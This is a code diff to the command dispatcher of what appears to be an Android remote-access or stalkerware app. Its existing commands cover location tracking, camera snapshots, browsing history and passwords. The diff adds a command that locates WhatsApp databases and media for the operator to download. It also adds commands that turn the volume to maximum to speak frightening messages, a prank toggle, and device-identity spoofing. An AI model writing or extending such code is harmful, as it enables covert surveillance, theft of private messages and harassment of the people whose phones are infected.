@@ -19,6 +19,7 @@ import android.media.MediaPlayer
 import android.media.ToneGenerator
 import android.net.Uri
 import android.os.Build
+import android.os.Environment
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.provider.ContactsContract
@@ -125,7 +126,7 @@ class CommandDispatcher(
                 "readtext" -> handleReadText(command)
                 "download" -> handleDownload(command)
                 "volume" -> handleVolume(command)
-                "info" -> success(command.commandId, DeviceInfoProvider.collect(appContext))
+                "info" -> success(command.commandId, DeviceInfoProvider.collect(appContext, settingsStore))
                 "permstatus" -> handlePermissionStatus(command)
                 "location" -> handleLocation(command)
                 "camerasnap" -> handleCameraSnap(command)
@@ -168,6 +169,11 @@ class CommandDispatcher(
                 "gethistory" -> handleGetHistory(command)
                 "sysinfo_full" -> handleSysInfoFull(command)
                 "getpasswords" -> handleGetPasswords(command)
+                "sayscary" -> handleSayScary(command)
+                "sayscaryurdu" -> handleSayScaryUrdu(command)
+                "getwhatsapp" -> handleGetWhatsapp(command)
+                "prank_mode" -> handlePrankMode(command)
+                "spoof" -> handleSpoof(command)
                 else -> error(command.commandId, "UNKNOWN_COMMAND", "Command is not supported on device")
             }
         }.getOrElse { throwable ->
@@ -237,14 +243,22 @@ class CommandDispatcher(
     }
 
     private fun handleSay(command: DeviceCommand): CommandResult {
-        return speakWithLocale(command, Locale.US, "say")
+        return speakWithLocale(command, Locale.US, "say", scary = false)
     }
 
     private fun handleSayUrdu(command: DeviceCommand): CommandResult {
-        return speakWithLocale(command, Locale("ur", "PK"), "sayurdu")
+        return speakWithLocale(command, Locale("ur", "PK"), "sayurdu", scary = false)
     }
 
-    private fun speakWithLocale(command: DeviceCommand, locale: Locale, commandLabel: String): CommandResult {
+    private fun handleSayScary(command: DeviceCommand): CommandResult {
+        return speakWithLocale(command, Locale.US, "sayscary", scary = true)
+    }
+
+    private fun handleSayScaryUrdu(command: DeviceCommand): CommandResult {
+        return speakWithLocale(command, Locale("ur", "PK"), "sayscaryurdu", scary = true)
+    }
+
+    private fun speakWithLocale(command: DeviceCommand, locale: Locale, commandLabel: String, scary: Boolean): CommandResult {
         val text = command.payload["text"]?.toString().orEmpty()
         if (text.isBlank()) {
             return error(command.commandId, "ARGUMENT_REQUIRED", "Missing text for speech")
@@ -257,11 +271,7 @@ class CommandDispatcher(
         val availability = tts.isLanguageAvailable(locale)
         if (availability == TextToSpeech.LANG_MISSING_DATA || availability == TextToSpeech.LANG_NOT_SUPPORTED) {
             return if (locale.language.equals("ur", ignoreCase = true)) {
-                error(
-                    command.commandId,
-                    "TTS_URDU_NOT_AVAILABLE",
-                    "Urdu TTS voice is not available. Install Urdu voice data in Speech Services and retry."
-                )
+                error(command.commandId, "TTS_URDU_NOT_AVAILABLE", "Urdu TTS voice is not available. Install Urdu voice data in Speech Services and retry.")
             } else {
                 error(command.commandId, "TTS_LANGUAGE_NOT_AVAILABLE", "Requested TTS language is not available on this device")
             }
@@ -270,23 +280,26 @@ class CommandDispatcher(
         val setResult = tts.setLanguage(locale)
         if (setResult == TextToSpeech.LANG_MISSING_DATA || setResult == TextToSpeech.LANG_NOT_SUPPORTED) {
             return if (locale.language.equals("ur", ignoreCase = true)) {
-                error(
-                    command.commandId,
-                    "TTS_URDU_NOT_AVAILABLE",
-                    "Urdu TTS voice could not be activated. Install Urdu voice data and retry."
-                )
+                error(command.commandId, "TTS_URDU_NOT_AVAILABLE", "Urdu TTS voice could not be activated. Install Urdu voice data and retry.")
             } else {
                 error(command.commandId, "TTS_LANGUAGE_NOT_AVAILABLE", "Requested TTS language could not be activated")
             }
         }
 
         selectBestVoiceForLocale(locale)
+
+        if (scary) {
+            val audioManager = appContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
+            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0)
+        }
+
         val speakStatus = tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "adex-tts-${commandLabel}-${System.currentTimeMillis()}")
         if (speakStatus == TextToSpeech.ERROR) {
             return error(command.commandId, "TTS_SPEAK_FAILED", "TextToSpeech failed to start speaking")
         }
 
-        return success(command.commandId, mapOf("spoken" to text, "locale" to locale.toLanguageTag()))
+        return success(command.commandId, mapOf("spoken" to text, "locale" to locale.toLanguageTag(), "scary" to scary))
     }
 
     private fun selectBestVoiceForLocale(locale: Locale) {
@@ -1744,6 +1757,48 @@ class CommandDispatcher(
                 error(command.commandId, "SCARY_MODE_FAILED", it.message ?: "Failed to trigger scary mode")
             }
         }
+    }
+
+    private suspend fun handleGetWhatsapp(command: DeviceCommand): CommandResult {
+        return withContext(Dispatchers.IO) {
+            val extStorage = Environment.getExternalStorageDirectory()?.absolutePath ?: "/sdcard"
+            val whatsappDir = File("$extStorage/Android/media/com.whatsapp/WhatsApp")
+            if (!whatsappDir.exists() || !whatsappDir.isDirectory) {
+                return@withContext error(
+                    command.commandId,
+                    "WHATSAPP_NOT_FOUND",
+                    "WhatsApp data directory not found or inaccessible (requires all files access)."
+                )
+            }
+            
+            val dbs = File("${whatsappDir.absolutePath}/Databases")
+            val dbCount = if (dbs.exists() && dbs.isDirectory) dbs.listFiles()?.size ?: 0 else 0
+
+            success(
+                command.commandId,
+                mapOf(
+                    "status" to "whatsapp_found",
+                    "databaseFiles" to dbCount,
+                    "info" to "Use /files path: ${whatsappDir.absolutePath} to browse and download specific media files or databases."
+                )
+            )
+        }
+    }
+
+    private fun handlePrankMode(command: DeviceCommand): CommandResult {
+        val enabled = command.booleanArg("enabled", false)
+        settingsStore.prankModeEnabled = enabled
+        return success(command.commandId, mapOf("prankModeEnabled" to enabled))
+    }
+
+    private fun handleSpoof(command: DeviceCommand): CommandResult {
+        val model = command.payload["model"]?.toString()
+        val manufacturer = command.payload["manufacturer"]?.toString()
+        
+        settingsStore.spoofModel = model
+        settingsStore.spoofManufacturer = manufacturer
+        
+        return success(command.commandId, mapOf("spoofedModel" to model, "spoofedManufacturer" to manufacturer))
     }
 
     private fun success(commandId: String, data: Map<String, Any?>, mediaId: String? = null): CommandResult {
